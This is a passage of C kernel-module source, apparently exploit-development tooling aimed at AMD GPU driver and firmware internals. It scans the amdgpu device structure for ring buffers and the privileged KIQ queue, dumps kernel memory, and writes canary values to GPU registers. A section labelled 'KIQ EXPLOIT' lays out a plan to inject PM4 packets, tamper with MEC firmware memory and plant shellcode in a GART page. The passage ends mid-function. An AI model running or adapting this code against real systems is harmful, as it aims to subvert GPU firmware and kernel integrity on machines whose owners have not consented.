		/* KIQ ring buffer is typically 4K-64K.
		 * Look for the pattern: [kptr] [gpu_addr(VRAM)] [size] */

		/* First find KIQ via known field patterns.
		 * The KIQ ring has a known structure:
		 *   +0x00: ring_obj (kptr or NULL)
		 *   +0x08: gpu_addr (MC/VRAM aligned)
		 *   +0x10: ring (kptr to CPU VA)
		 *   +0x18: ring_size (typically 0x1000-0x10000)
		 *   +0x20: wptr (small value)
		 *   +0x28: rptr (small value)
		 *   +0x30: doorbell_index
		 *
		 * Strategy: Search for gpu_addr in GART range followed by
		 * a kptr and a small power-of-2 size.
		 */

		/* GART range: [0x7FFF00000000, 0x7FFF1FFFF000] */
		for (off = 8; off < 0x80000 && found < 15; off += 8) {
			u64 val = *(u64 *)((u8 *)adev + off);

			/* Look for GART-range GPU addresses */
			if (val >= 0x7FFF00000000ULL && val <= 0x7FFF20000000ULL &&
			    (val & 0xFFF) == 0) {
				u64 prev = (off >= 8) ? *(u64 *)((u8 *)adev + off - 8) : 0;
				u64 next = *(u64 *)((u8 *)adev + off + 8);
				u64 next2 = *(u64 *)((u8 *)adev + off + 16);
				u64 next3 = *(u64 *)((u8 *)adev + off + 24);

				/* Check if next is kptr (ring CPU VA) */
				int is_ring = 0;
				if ((next >> 48) == 0xFFFF && next != 0xFFFFFFFFFFFFFFFFULL) {
					/* And next2 is a reasonable ring size */
					if (next2 >= 0x1000 && next2 <= 0x100000 &&
					    (next2 & (next2 - 1)) == 0)
						is_ring = 1;
				}

				if (is_ring) {
					u32 hdr[8];
					pr_info("fw36: *** RING CANDIDATE at adev+0x%X ***\n", off);
					pr_info("fw36:   gpu_addr = 0x%llX\n", val);
					pr_info("fw36:   cpu_va   = 0x%llX\n", next);
					pr_info("fw36:   size     = 0x%llX (%llu KB)\n",
						next2, next2 / 1024);
					pr_info("fw36:   wptr?    = 0x%llX\n", next3);

					/* Read first 32 bytes of ring buffer */
					if (copy_from_kernel_nofault(hdr,
						(void *)(unsigned long)next, 32) == 0) {
						pr_info("fw36:   ring[0]: %08X %08X %08X %08X "
							"%08X %08X %08X %08X\n",
							hdr[0], hdr[1], hdr[2], hdr[3],
							hdr[4], hdr[5], hdr[6], hdr[7]);
					}

					/* Read wider context around the ring struct */
					{
						int c;
						for (c = -40; c <= 80; c += 8) {
							int co = off + c;
							if (co >= 0 && co < 0x80000) {
								u64 cv = *(u64 *)((u8 *)adev + co);
								const char *tag = "";
								if ((cv >> 48) == 0xFFFF &&
								    cv != 0xFFFFFFFFFFFFFFFFULL)
									tag = " kptr";
								else if (cv >= 0x7FFF00000000ULL &&
								         cv <= 0x7FFF20000000ULL)
									tag = " GART";
								else if (cv >= 0x8000000000ULL &&
								         cv <= 0x9800000000ULL)
									tag = " VRAM";
								pr_info("fw36:   [+%03d] = 0x%016llX%s\n",
									c, cv, tag);
							}
						}
					}
					found++;
				}
			}
		}

		if (!found) {
			/* Wider search: any GART-range address */
			pr_info("fw36: No ring candidates via GART. Scanning for any rings...\n");
			for (off = 8; off < 0x80000 && found < 10; off += 8) {
				u64 val = *(u64 *)((u8 *)adev + off);
				u64 next = *(u64 *)((u8 *)adev + off + 8);
				/* Any page-aligned kptr pair */
				if ((val >> 48) == 0xFFFF && (val & 0xFFF) == 0 &&
				    val != 0xFFFFFFFFFFFFFFFFULL) {
					u64 next2 = *(u64 *)((u8 *)adev + off + 16);
					if (next >= 0x7FFF00000000ULL && next <= 0x7FFF20000000ULL &&
					    (next & 0xFFF) == 0) {
						pr_info("fw36: Ring? adev+0x%X: kptr=0x%llX gpu=0x%llX val2=0x%llX\n",
							off, val, next, next2);
						found++;
					}
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH N: adev->gfx.kiq offset search
	 *
	 * The KIQ ring is at a specific offset within adev.
	 * In the amdgpu driver, adev->gfx is at a known offset.
	 * Try to find it by searching for the KIQ's MEC engine
	 * register values we already know.
	 *
	 * Known: KIQ DOORBELL_RANGE_UPPER (0x2908) = 0x800
	 * The KIQ doorbell_index should be near this.
	 * =========================================== */
	pr_info("fw36: === APPROACH N: KIQ DOORBELL SEARCH ===\n");
	{
		/* The doorbell index for KIQ is typically stored near
		 * the ring struct. The driver sets it during init.
		 * Search for small doorbell values (0-0x400) near
		 * ring-like structures. Also look for "kiq" function
		 * pointers (funcs vtable). */

		int off;
		/* Search for the magic KIQ identification:
		 * me=1, pipe=0, queue=0 stored as small ints nearby */
		for (off = 0; off < 0x80000 - 32; off += 4) {
			u32 v0 = *(u32 *)((u8 *)adev + off);
			u32 v1 = *(u32 *)((u8 *)adev + off + 4);
			u32 v2 = *(u32 *)((u8 *)adev + off + 8);

			/* ME=1, PIPE=0, QUEUE=0 pattern */
			if (v0 == 1 && v1 == 0 && v2 == 0) {
				/* Check if this is near a GPU address */
				int ctx;
				int has_gpu = 0;
				for (ctx = -64; ctx <= 64; ctx += 8) {
					int co = off + ctx;
					if (co >= 0 && co < 0x80000) {
						u64 cv = *(u64 *)((u8 *)adev + co);
						if (cv >= 0x7FFF00000000ULL &&
						    cv <= 0x7FFF20000000ULL)
							has_gpu = 1;
					}
				}
				if (has_gpu) {
					pr_info("fw36: KIQ candidate at adev+0x%X: me=%u pipe=%u queue=%u\n",
						off, v0, v1, v2);
					/* Print context */
					{
						int c;
						for (c = -32; c <= 96; c += 8) {
							int co = off + c;
							if (co >= 0 && co < 0x80000) {
								u64 cv = *(u64 *)((u8 *)adev + co);
								const char *tag = "";
								if ((cv >> 48) == 0xFFFF &&
								    cv != 0xFFFFFFFFFFFFFFFFULL)
									tag = " kptr";
								else if (cv >= 0x7FFF00000000ULL &&
								         cv <= 0x7FFF20000000ULL)
									tag = " GART";
								pr_info("fw36:   [+%03d] = 0x%016llX%s\n",
									c, cv, tag);
							}
						}
					}
					break;
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH O: Deep ring struct analysis
	 *
	 * Found ring candidates. Now dump the full ring struct
	 * for each to find ring buffer CPU VA, wptr, rptr, etc.
	 * Also find the KIQ ring specifically and try to read
	 * its MQD and ring buffer contents.
	 * =========================================== */
	pr_info("fw36: === APPROACH O: RING STRUCT DEEP ANALYSIS ===\n");
	{
		/* Dump 512 bytes around each ring candidate to find
		 * the amdgpu_ring struct layout */
		int ring_offsets[] = {0xFD98, 0x10AD8, 0x10D30, 0x14B68, 0x3B900, 0x3B958};
		int r;

		for (r = 0; r < 6; r++) {
			int base = ring_offsets[r];
			int c;
			u64 ring_gpu = 0, ring_cpu = 0;
			u32 ring_size = 0;

			pr_info("fw36: --- Ring at adev+0x%X ---\n", base);

			/* Search backward from the kptr to find the ring struct start.
			 * The struct typically starts ~256 bytes before the kptr/gpu pair.
			 * Dump 512 bytes centered on the match. */
			for (c = -256; c <= 256; c += 8) {
				int co = base + c;
				if (co >= 0 && co < 0x80000) {
					u64 cv = *(u64 *)((u8 *)adev + co);
					const char *tag = "";

					if ((cv >> 48) == 0xFFFF && cv != 0xFFFFFFFFFFFFFFFFULL)
						tag = " kptr";
					else if (cv >= 0x7FFF00000000ULL && cv <= 0x7FFF20000000ULL)
						tag = " GART";
					else if (cv >= 0x8000000000ULL && cv <= 0x9800000000ULL)
						tag = " VRAM";
					else if (cv >= 0x1000 && cv <= 0x100000 &&
					         (cv & (cv - 1)) == 0)
						tag = " POW2";

					/* Only print interesting values */
					if (cv != 0 && tag[0] != '\0')
						pr_info("fw36:   adev+0x%05X = 0x%016llX%s\n",
							co, cv, tag);
					/* Also print if it looks like wptr/rptr (small values near ring) */
					else if (cv != 0 && cv < 0x10000 && c >= -32 && c <= 64)
						pr_info("fw36:   adev+0x%05X = 0x%016llX (small)\n",
							co, cv);
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH P: KIQ MQD + Ring buffer read
	 *
	 * adev+0x16AD8 has me=1, pipe=0, queue=0 (KIQ).
	 * The kptr at adev+0x16AC8 and GART at adev+0x16AF0
	 * are part of the KIQ's ring structure.
	 * Try to read the kptrs to find ring buffer contents.
	 * =========================================== */
	pr_info("fw36: === APPROACH P: KIQ MQD + RING BUFFER ===\n");
	{
		u64 kiq_ptr1 = *(u64 *)((u8 *)adev + 0x16AC8);  /* kptr before KIQ */
		u64 kiq_gart = *(u64 *)((u8 *)adev + 0x16AF0);  /* GART addr */
		u64 kiq_ptr2 = *(u64 *)((u8 *)adev + 0x16AE8);  /* +016 kptr */
		u64 kiq_ptr3 = *(u64 *)((u8 *)adev + 0x16B28);  /* +080 kptr */
		u64 kiq_ptr4 = *(u64 *)((u8 *)adev + 0x16B30);  /* +088 kptr */
		u64 kiq_ptr5 = *(u64 *)((u8 *)adev + 0x16B38);  /* +096 kptr */

		pr_info("fw36: KIQ kptr1 = 0x%llX\n", kiq_ptr1);
		pr_info("fw36: KIQ gart  = 0x%llX\n", kiq_gart);
		pr_info("fw36: KIQ kptr2 = 0x%llX\n", kiq_ptr2);
		pr_info("fw36: KIQ kptr3 = 0x%llX\n", kiq_ptr3);
		pr_info("fw36: KIQ kptr4 = 0x%llX\n", kiq_ptr4);
		pr_info("fw36: KIQ kptr5 = 0x%llX\n", kiq_ptr5);

		/* Now search for the ACTUAL amdgpu_ring struct for KIQ.
		 * The ring struct has ring->gpu_addr = GART addr,
		 * ring->ring = CPU VA of the ring buffer.
		 * Search near the KIQ location for a struct that
		 * contains the GART address. */
		{
			int off;
			for (off = 0x14000; off < 0x18000; off += 8) {
				u64 val = *(u64 *)((u8 *)adev + off);
				if (val == kiq_gart || val == (kiq_gart & ~0xFFFULL)) {
					u64 prev = *(u64 *)((u8 *)adev + off - 8);
					u64 next = *(u64 *)((u8 *)adev + off + 8);
					pr_info("fw36: GART addr match at adev+0x%X: "
						"prev=0x%llX this=0x%llX next=0x%llX\n",
						off, prev, val, next);
				}
			}
		}

		/* Try to read each kptr */
		{
			u64 kptrs[] = {kiq_ptr1, kiq_ptr2, kiq_ptr3, kiq_ptr4, kiq_ptr5};
			const char *names[] = {"kptr1(-16)", "kptr2(+16)", "kptr3(+80)",
			                       "kptr4(+88)", "kptr5(+96)"};
			int k;

			for (k = 0; k < 5; k++) {
				u64 kp = kptrs[k];
				if ((kp >> 48) == 0xFFFF && kp != 0xFFFFFFFFFFFFFFFFULL) {
					u32 hdr[16];
					if (copy_from_kernel_nofault(hdr, (void *)(unsigned long)kp,
						64) == 0) {
						pr_info("fw36: %s @ 0x%llX:\n", names[k], kp);
						pr_info("fw36:   %08X %08X %08X %08X\n",
							hdr[0], hdr[1], hdr[2], hdr[3]);
						pr_info("fw36:   %08X %08X %08X %08X\n",
							hdr[4], hdr[5], hdr[6], hdr[7]);
						pr_info("fw36:   %08X %08X %08X %08X\n",
							hdr[8], hdr[9], hdr[10], hdr[11]);
						pr_info("fw36:   %08X %08X %08X %08X\n",
							hdr[12], hdr[13], hdr[14], hdr[15]);
					} else {
						pr_info("fw36: %s @ 0x%llX: FAULT\n", names[k], kp);
					}
				}
			}
		}

		/* Try to find the ring struct for each candidate.
		 * In amdgpu, struct amdgpu_ring fields (approximately):
		 *   +0x000: adev pointer
		 *   +0x008: funcs pointer
		 *   +0x028: fence_drv
		 *   +0x0C0: ring (cpu VA of ring buffer)
		 *   +0x0C8: ring_obj (BO)
		 *   +0x0D0: gpu_addr
		 *   +0x0D8: ring_size
		 *   ...
		 * But offsets vary by kernel version. Search for
		 * adev pointer + nearby GART address.
		 */
		pr_info("fw36: === Ring struct search (adev ptr + GART nearby) ===\n");
		{
			int off;
			u64 adev_val = (u64)(unsigned long)adev;

			for (off = 0; off < 0x80000; off += 8) {
				u64 val = *(u64 *)((u8 *)adev + off);
				if (val == adev_val) {
					/* Found adev pointer — check nearby for GART */
					int c;
					for (c = 8; c <= 256; c += 8) {
						int co = off + c;
						if (co < 0x80000) {
							u64 cv = *(u64 *)((u8 *)adev + co);
							if (cv >= 0x7FFF00000000ULL &&
							    cv <= 0x7FFF20000000ULL &&
							    (cv & 0xFFF) == 0) {
								pr_info("fw36: Ring struct? adev+0x%X: "
									"adev_ptr, GART=0x%llX at +0x%X\n",
									off, cv, c);

								/* Dump the full candidate struct */
								{
									int d;
									for (d = 0; d < 256; d += 8) {
										int doff = off + d;
										if (doff < 0x80000) {
											u64 dv = *(u64 *)((u8 *)adev + doff);
											const char *dt = "";
											if ((dv >> 48) == 0xFFFF &&
											    dv != 0xFFFFFFFFFFFFFFFFULL)
												dt = " kptr";
											else if (dv >= 0x7FFF00000000ULL &&
											         dv <= 0x7FFF20000000ULL)
												dt = " GART";
											if (dv != 0)
												pr_info("fw36:   [+0x%03X] = 0x%016llX%s\n",
													d, dv, dt);
										}
									}
								}
								goto found_ring;
							}
						}
					}
				}
			}
			found_ring:
			(void)0;
		}
	}

	pr_info("fw36: === MODE 17 COMPLETE ===\n");
	pr_info("fw36: Final PC = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));
	#undef GC0
}

/* =============================================================================
 * Mode 18: KIQ EXPLOIT — Ring Buffer PM4 Injection
 *
 * Mode 17 found:
 *   - KIQ ring struct at adev+0x16AD8 (me=1, pipe=0, queue=0)
 *   - KIQ kptrs with MAP_QUEUES PM4 headers (0xC0310800)
 *   - Ring CPU VA at adev+0x3B910 area (0xFFFFCF8702A35000)
 *   - 5 writable GP registers: 0x2960, 0x2962, 0x2963, 0x2971, 0x2972
 *
 * Attack plan:
 *   A) Read full KIQ ring buffer via CPU VA — find current rptr/wptr
 *   B) Analyze MAP_QUEUES MQD format — understand queue mapping protocol
 *   C) Find MEC dispatch table offset via GP register probing
 *   D) Craft WRITE_DATA PM4 packet to write to MEC data memory via KIQ
 *   E) Attempt MAP_QUEUES with custom MQD pointing to our code page
 *   F) Direct GART write — allocate a GART-mapped page, write shellcode
 * ============================================================================= */
static void kiq_exploit(void *psp, void *adev)
{
	u32 gc_base0;
	u32 pc_orig;

	pr_info("fw36: === MODE 18: KIQ EXPLOIT (PM4 Injection) ===\n");

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) { pr_info("fw36: gc_base0 FAIL\n"); return; }
	#define GC0(r) (gc_base0 + (r))

	pc_orig = rr(regCP_MEC1_INSTR_PNTR);
	pr_info("fw36: MEC PC = 0x%04X\n", pc_orig);

	/* ===========================================
	 * APPROACH A: Find and read KIQ ring buffer
	 *
	 * Search adev for the KIQ ring struct:
	 * - Pattern: kptr, gpu_addr, ring_size in known layout
	 * - KIQ found at adev+0x16AD8 in mode 17
	 * - Also ring struct at adev+0x3B910 with PSP ring
	 * =========================================== */
	pr_info("fw36: === APPROACH A: KIQ RING BUFFER READ ===\n");
	{
		/* Known offsets from mode 17 approach N/P */
		int kiq_offsets[] = {0x16AD8, 0xFD98, 0x10AD8, 0x10D30,
		                     0x14B68, 0x3B900, 0x3B958};
		int nkiq = sizeof(kiq_offsets) / sizeof(kiq_offsets[0]);
		int k;

		for (k = 0; k < nkiq; k++) {
			int off = kiq_offsets[k];
			u64 val;
			void __iomem *ring_va;
			u64 gpu_addr;
			u32 ring_size;

			/* Check for kernel pointer at this offset */
			val = *(u64 *)((u8 *)adev + off);
			if ((val >> 48) != 0xFFFF)
				continue;

			pr_info("fw36: Ring candidate adev+0x%X: kptr=0x%llX\n", off, val);

			/* Look for ring metadata: gpu_addr at +8, size at +16 or +20 */
			gpu_addr = *(u64 *)((u8 *)adev + off + 8);
			ring_size = *(u32 *)((u8 *)adev + off + 16);

			/* Check if gpu_addr looks like GART or VRAM */
			if ((gpu_addr >= 0x7FFF00000000ULL && gpu_addr <= 0x7FFF20000000ULL) ||
			    (gpu_addr >= 0x8000000000ULL && gpu_addr <= 0xA000000000ULL)) {
				pr_info("fw36:   gpu_addr=0x%llX size=0x%X\n", gpu_addr, ring_size);
			}

			/* Try to read ring buffer content via kptr */
			ring_va = (void __iomem *)val;
			if (virt_addr_valid(ring_va)) {
				u32 *ring = (u32 *)ring_va;
				int i, nz = 0;
				pr_info("fw36:   Ring buffer readable at kptr:\n");

				/* Count non-zero dwords */
				for (i = 0; i < 256 && i < (ring_size / 4); i++) {
					if (ring[i] != 0) nz++;
				}
				pr_info("fw36:   Non-zero dwords in first 1KB: %d\n", nz);

				/* Dump first 64 dwords looking for PM4 headers */
				for (i = 0; i < 64; i += 4) {
					u32 d0 = ring[i], d1 = ring[i+1];
					u32 d2 = ring[i+2], d3 = ring[i+3];
					if (d0 || d1 || d2 || d3) {
						pr_info("fw36:   [%03X] %08X %08X %08X %08X",
							i*4, d0, d1, d2, d3);

						/* Decode PM4 headers */
						if ((d0 >> 30) == 3) {
							u32 opcode = (d0 >> 8) & 0xFF;
							u32 count = d0 & 0x3FFF;
							pr_cont(" PM4:type3 op=0x%02X cnt=%d", opcode, count);
							if (opcode == 0x31)
								pr_cont(" MAP_QUEUES");
							else if (opcode == 0x32)
								pr_cont(" WRITE_DATA");
							else if (opcode == 0x37)
								pr_cont(" UNMAP_QUEUES");
							else if (opcode == 0x3F)
								pr_cont(" INVALIDATE_TLBS");
							else if (opcode == 0x49)
								pr_cont(" SET_RESOURCES");
							else if (opcode == 0x10)
								pr_cont(" NOP");
						}
						pr_cont("\n");
					}
				}

				/* Scan deeper for MAP_QUEUES packets (0xC031xxxx) */
				{
					int mq_count = 0;
					for (i = 0; i < 1024 && i < (ring_size / 4); i++) {
						if ((ring[i] >> 16) == 0xC031) {
							pr_info("fw36:   MAP_QUEUES at [0x%X]: %08X %08X %08X %08X %08X %08X %08X %08X\n",
								i*4, ring[i], ring[i+1], ring[i+2], ring[i+3],
								ring[i+4], ring[i+5], ring[i+6], ring[i+7]);
							mq_count++;
							if (mq_count >= 4) break;
						}
					}
					if (mq_count)
						pr_info("fw36:   Found %d MAP_QUEUES packets\n", mq_count);
				}
			} else {
				pr_info("fw36:   kptr 0x%llX not virt_addr_valid\n", val);
			}
		}

		/* Also read MQD backup buffer kptrs from KIQ (adev+0x16AD8) */
		pr_info("fw36: === KIQ MQD Backup Buffers ===\n");
		{
			int mqd_off;
			for (mqd_off = 0x16AD8 + 80; mqd_off <= 0x16AD8 + 96; mqd_off += 8) {
				u64 mqd_kptr = *(u64 *)((u8 *)adev + mqd_off);
				if ((mqd_kptr >> 48) == 0xFFFF && virt_addr_valid((void *)mqd_kptr)) {
					u32 *mqd = (u32 *)(void *)mqd_kptr;
					int i;
					pr_info("fw36: MQD at adev+0x%X (kptr=0x%llX):\n", mqd_off, mqd_kptr);
					for (i = 0; i < 64; i += 4) {
						if (mqd[i] || mqd[i+1] || mqd[i+2] || mqd[i+3]) {
							pr_info("fw36:   [%03X] %08X %08X %08X %08X\n",
								i*4, mqd[i], mqd[i+1], mqd[i+2], mqd[i+3]);
						}
					}
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH B: Read KIQ HW registers — rptr/wptr/doorbell
	 *
	 * The KIQ has its own set of HQD registers.
	 * We need the current rptr and wptr to know where
	 * to inject our PM4 packet.
	 * =========================================== */
	pr_info("fw36: === APPROACH B: KIQ HW STATE ===\n");
	{
		u32 mec_cntl = rr(regCP_MEC_CNTL);
		u32 i;

		/* Select KIQ: me=1, pipe=0, queue=0 via MEC pipe select */
		/* SOC15(0x2944) = CP_HQD_PIPE_PRIORITY, need to set pipe/queue first */

		/* Read HQD registers for the KIQ (me1, pipe0, queue0) */
		/* The GRBM_GFX_INDEX/CNTL should already be set for pipe0 if we
		 * haven't changed it */

		pr_info("fw36: HQD registers (current pipe/queue):\n");
		pr_info("fw36:   CP_HQD_ACTIVE     = 0x%08X\n", rr(GC0(0x2940)));
		pr_info("fw36:   CP_HQD_VMID       = 0x%08X\n", rr(GC0(0x2941)));
		pr_info("fw36:   CP_HQD_PQ_BASE_LO = 0x%08X\n", rr(GC0(0x2943)));
		pr_info("fw36:   CP_HQD_PQ_BASE_HI = 0x%08X\n", rr(GC0(0x2944)));
		pr_info("fw36:   CP_HQD_PQ_RPTR    = 0x%08X\n", rr(GC0(0x2946)));
		pr_info("fw36:   CP_HQD_PQ_WPTR_LO = 0x%08X\n", rr(GC0(0x294A)));
		pr_info("fw36:   CP_HQD_PQ_WPTR_HI = 0x%08X\n", rr(GC0(0x294B)));
		pr_info("fw36:   CP_HQD_PQ_CONTROL = 0x%08X\n", rr(GC0(0x2945)));
		pr_info("fw36:   CP_HQD_PQ_DOORBELL_CONTROL = 0x%08X\n", rr(GC0(0x2948)));
		pr_info("fw36:   CP_HQD_QUANTUM    = 0x%08X\n", rr(GC0(0x294C)));
		pr_info("fw36:   CP_HQD_EOP_BASE_ADDR = 0x%08X\n", rr(GC0(0x294E)));
		pr_info("fw36:   CP_HQD_EOP_BASE_ADDR_HI = 0x%08X\n", rr(GC0(0x294F)));
		pr_info("fw36:   CP_HQD_EOP_CONTROL = 0x%08X\n", rr(GC0(0x2950)));

		/* MEC_CNTL bits for KIQ */
		pr_info("fw36:   MEC_CNTL=0x%08X (halted=%d)\n",
			mec_cntl, (mec_cntl >> 28) & 1);

		/* Now scan GRBM_GFX_CNTL to select different pipe/queue combos
		 * and read their HQD_ACTIVE state */
		pr_info("fw36: === Queue Activity Map ===\n");
		{
			/* GRBM_GFX_CNTL at GC0(0x1000) or thereabouts.
			 * Format: bits[3:2]=MEID, bits[5:4]=PIPEID, bits[10:8]=QUEUEID
			 * We need to carefully save/restore this. */
			u32 grbm_orig = rr(GC0(0x1000));
			int me, pipe, queue;

			pr_info("fw36: GRBM_GFX_CNTL orig = 0x%08X\n", grbm_orig);

			for (me = 1; me <= 2; me++) {
				for (pipe = 0; pipe < 4; pipe++) {
					for (queue = 0; queue < 8; queue++) {
						u32 sel = (me << 2) | (pipe << 4) | (queue << 8);
						u32 active;
						wr(GC0(0x1000), sel);
						udelay(5);
						active = rr(GC0(0x2940)); /* CP_HQD_ACTIVE */
						if (active) {
							u32 pq_base_lo = rr(GC0(0x2943));
							u32 pq_base_hi = rr(GC0(0x2944));
							u32 pq_rptr = rr(GC0(0x2946));
							u32 pq_wptr = rr(GC0(0x294A));
							u32 pq_ctrl = rr(GC0(0x2945));
							u32 vmid = rr(GC0(0x2941));
							u64 pq_base = ((u64)pq_base_hi << 32) | ((u64)pq_base_lo << 8);

							pr_info("fw36:   ME%d P%d Q%d: ACTIVE=%d VMID=%d "
								"PQ_BASE=0x%llX RPTR=0x%X WPTR=0x%X CTRL=0x%08X\n",
								me, pipe, queue, active, vmid & 0xF,
								pq_base, pq_rptr, pq_wptr, pq_ctrl);
						}
					}
				}
			}

			/* Restore original selection */
			wr(GC0(0x1000), grbm_orig);
			udelay(5);
		}
	}

	/* ===========================================
	 * APPROACH C: GP Register Protocol Test
	 *
	 * 5 GP registers are writable from host:
	 *   0x2960, 0x2962, 0x2963, 0x2971, 0x2972
	 *
	 * The MEC firmware reads these during packet processing.
	 * If we write specific values and observe MEC behavior change,
	 * we can use them as a communication channel.
	 *
	 * Test: Write canary values, check if MEC clears/modifies them
	 * (which would prove firmware is actively reading them).
	 * =========================================== */
	pr_info("fw36: === APPROACH C: GP REGISTER PROTOCOL ===\n");
	{
		u32 gp_regs[] = {0x2960, 0x2962, 0x2963, 0x2971, 0x2972};
		u32 gp_orig[5];
		int i;

		/* Read originals */
		for (i = 0; i < 5; i++) {
			gp_orig[i] = rr(GC0(gp_regs[i]));
			pr_info("fw36: GP[0x%04X] orig = 0x%08X\n", gp_regs[i], gp_orig[i]);
		}

		/* Write canary pattern */
		for (i = 0; i < 5; i++) {
			wr(GC0(gp_regs[i]), 0xDEAD0000 | i);
		}
		udelay(100);

		/* Check if MEC modified them */
		for (i = 0; i < 5; i++) {
			u32 now = rr(GC0(gp_regs[i]));
			pr_info("fw36: GP[0x%04X] canary=0x%08X now=0x%08X %s\n",
				gp_regs[i], 0xDEAD0000 | i, now,
				now != (0xDEAD0000 | i) ? "*** MODIFIED ***" : "untouched");
		}

		/* Wait longer and re-check (firmware might poll periodically) */
		mdelay(10);
		for (i = 0; i < 5; i++) {
			u32 now = rr(GC0(gp_regs[i]));
			if (now != (0xDEAD0000 | i)) {
				pr_info("fw36: GP[0x%04X] changed after 10ms: 0x%08X\n",
					gp_regs[i], now);
			}
		}

		/* Restore originals */
		for (i = 0; i < 5; i++) {
			wr(GC0(gp_regs[i]), gp_orig[i]);
		}
	}

	/* ===========================================
	 * APPROACH D: WRITE_DATA PM4 to MEC Data Memory
	 *
	 * PM4 WRITE_DATA (opcode 0x32) can write to
	 * GPU memory addresses. If we can find a ring buffer
	 * that the MEC is actively processing, we can inject
	 * a WRITE_DATA packet targeting MDBASE offsets.
	 *
	 * WRITE_DATA format (type 3):
	 *   DW0: header (0xC0033200 for 4 dwords payload)
	 *   DW1: control (dst_sel, wr_confirm, engine_sel)
	 *   DW2: dst_addr_lo
	 *   DW3: dst_addr_hi
	 *   DW4+: data
	 *
	 * Try writing to ring buffers found in mode 17.
	 * =========================================== */
	pr_info("fw36: === APPROACH D: FIND WRITABLE RING BUFFERS ===\n");
	{
		/* Scan adev for ring structs with identifiable patterns:
		 * Look for the pattern: kptr (ffff...), gpu_addr (7fff or 8000 range),
		 * size (power of 2), wptr_cpu_addr (ffff...) */
		int off;
		int ring_count = 0;

		/* Structured scan: look for 64-bit kernel ptrs followed by
		 * 64-bit GPU addresses in GART range */
		for (off = 0; off < 0x50000; off += 8) {
			u64 v0 = *(u64 *)((u8 *)adev + off);
			u64 v1 = *(u64 *)((u8 *)adev + off + 8);
			u64 v2 = *(u64 *)((u8 *)adev + off + 16);

			/* Pattern: kptr followed by GART addr */
			if ((v0 >> 48) == 0xFFFF &&
			    v0 != 0xFFFFFFFFFFFFFFFFULL &&
			    v1 >= 0x7FFF00000000ULL &&
			    v1 <= 0x7FFF20000000ULL &&
			    (v1 & 0xFFF) == 0) {

				u32 maybe_size = (u32)v2;
				u32 maybe_wptr = *(u32 *)((u8 *)adev + off + 24);

				/* Check if kptr is valid and size is power-of-2 */
				if (virt_addr_valid((void *)v0) &&
				    maybe_size >= 0x100 && maybe_size <= 0x200000 &&
				    (maybe_size & (maybe_size - 1)) == 0) {

					u32 *ring = (u32 *)(void *)v0;
					int nz = 0, pm4_hdrs = 0;
					int i;

					for (i = 0; i < (int)(maybe_size / 4) && i < 1024; i++) {
						if (ring[i]) nz++;
						if ((ring[i] >> 30) == 3) pm4_hdrs++;
					}

					pr_info("fw36: Ring at adev+0x%X: kptr=0x%llX gpu=0x%llX "
						"size=0x%X nz=%d pm4=%d\n",
						off, v0, v1, maybe_size, nz, pm4_hdrs);

					ring_count++;
					if (ring_count >= 8) break;
				}
			}
		}
		pr_info("fw36: Found %d ring buffer candidates\n", ring_count);
	}

	/* ===========================================
	 * APPROACH E: KIQ Doorbell Ring Submission
	 *
	 * The KIQ is the privileged management queue.
	 * If we can find its doorbell, ring buffer, and wptr,
	 * we can submit PM4 packets directly.
	 *
	 * KIQ doorbell from mode 17: SOC15(0x2908) = 0x800
	 * KIQ found at adev+0x16AD8
	 *
	 * Strategy:
	 * 1. Find KIQ wptr (software wptr in adev, or HQD register)
	 * 2. Write PM4 WRITE_DATA packet at wptr position
	 * 3. Ring doorbell to notify MEC
	 *
	 * First: just READ the KIQ state to understand format.
	 * =========================================== */
	pr_info("fw36: === APPROACH E: KIQ DETAILED STATE ===\n");
	{
		/* Walk the adev KIQ area more carefully.
		 * struct amdgpu_ring typically has:
		 *   +0x00: ring_obj (bo pointer)
		 *   +0x08: gpu_addr (u64)
		 *   +0x10: ring_size (u32 in dwords)
		 *   +0x14: align_mask
		 *   +0x18: buf_mask
		 *   +0x1C: idx (u32)
		 *   +0x20: funcs ptr
		 *   +0x28: fence_drv
		 *   +0x??: ring (u32 *cpu_ptr)
		 *   +0x??: wptr, wptr_old, rptr
		 *   +0x??: doorbell_index
		 *
		 * But the exact layout varies. Let's dump the full KIQ struct. */

		int kiq_base = 0x16AD8;
		int i;

		pr_info("fw36: KIQ struct dump (adev+0x%X, 512 bytes):\n", kiq_base);
		for (i = 0; i < 512; i += 32) {
			u64 a = *(u64 *)((u8 *)adev + kiq_base + i);
			u64 b = *(u64 *)((u8 *)adev + kiq_base + i + 8);
			u64 c = *(u64 *)((u8 *)adev + kiq_base + i + 16);
			u64 d = *(u64 *)((u8 *)adev + kiq_base + i + 24);

			if (a || b || c || d) {
				const char *ta = "", *tb = "", *tc = "", *td = "";
				if ((a >> 48) == 0xFFFF && a != 0xFFFFFFFFFFFFFFFFULL) ta = " kptr";
				if ((b >> 48) == 0xFFFF && b != 0xFFFFFFFFFFFFFFFFULL) tb = " kptr";
				if ((c >> 48) == 0xFFFF && c != 0xFFFFFFFFFFFFFFFFULL) tc = " kptr";
				if ((d >> 48) == 0xFFFF && d != 0xFFFFFFFFFFFFFFFFULL) td = " kptr";
				if (a >= 0x7FFF00000000ULL && a <= 0x7FFF20000000ULL) ta = " GART";
				if (b >= 0x7FFF00000000ULL && b <= 0x7FFF20000000ULL) tb = " GART";
				if (c >= 0x7FFF00000000ULL && c <= 0x7FFF20000000ULL) tc = " GART";
				if (d >= 0x7FFF00000000ULL && d <= 0x7FFF20000000ULL) td = " GART";

				pr_info("fw36:   [+%03X] %016llX%s %016llX%s %016llX%s %016llX%s\n",
					i, a, ta, b, tb, c, tc, d, td);
			}
		}

		/* Also look at wider KIQ context — the MEC scheduler area */
		/* amdgpu_kiq usually lives inside adev->gfx.kiq[0] */
		/* Check ~0x16A00-0x16F00 for the full KIQ structure */
		pr_info("fw36: KIQ wider context (adev+0x16A00 to +0x16F00):\n");
		{
			int interesting = 0;
			for (i = 0x16A00; i < 0x16F00; i += 8) {
				u64 v = *(u64 *)((u8 *)adev + i);
				if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL) {
					if (interesting < 32) {
						const char *t = "";
						if ((v >> 48) == 0xFFFF) t = " kptr";
						if (v >= 0x7FFF00000000ULL && v <= 0x7FFF20000000ULL) t = " GART";
